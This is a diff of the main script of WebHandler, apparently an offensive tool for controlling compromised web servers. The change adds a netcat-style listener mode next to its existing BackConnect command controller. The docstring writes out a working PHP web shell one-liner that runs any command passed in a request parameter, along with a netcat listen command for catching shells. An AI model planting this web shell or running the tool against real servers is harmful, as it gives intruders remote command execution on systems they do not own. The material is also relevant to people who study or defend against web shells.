@@ -3,7 +3,9 @@
 '''
 -*- coding: utf-8 -*-
 
-Command controller for <?php system($_REQUEST['parameter']); ?>
+A hanlder for PHP system functions & alternative 'netcat listener'
+    - <?php system($_REQUEST['parameter']); ?>
+    - netcat -l -p 1234
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -24,10 +26,12 @@ Developers:
 '''
 
 # Importing modules
-from core.libs.update import update
 from core.libs.executer import commander
+from core.libs.listen_handler import listen
 from core.libs.menu import getargs, banner, Colors
+from core.libs.update import update
 from core.modules.info import info
+
 
 # Check for arguments dependencies
 if getargs.url:
@@ -38,9 +42,14 @@ if getargs.url:
         errmsg = '\n[!] Using get method doesn\'t require --parameter flag, check help'
         exit('{0}{1}{2}'.format(Colors.RED, errmsg, Colors.END))
     else:
-        print banner                            # Get WebHandler banner
+        print banner                            # Print the banner
         info.get_information()                  # Call get_information and print info
-        commander.BackConnect()                 # Call BackConnect method
+        commander.BackConnect()                 # Call BackConnect method to handle input
 
-if getargs.update:
-    update()
+elif getargs.listen:
+    print banner                                # Print the banner
+    listen.wait_connection()                    # Call wait_connection to wait for a connection
+    listen.connected()                          # Call connected and print info
+
+elif getargs.update:
+    update()                                    # Update the script
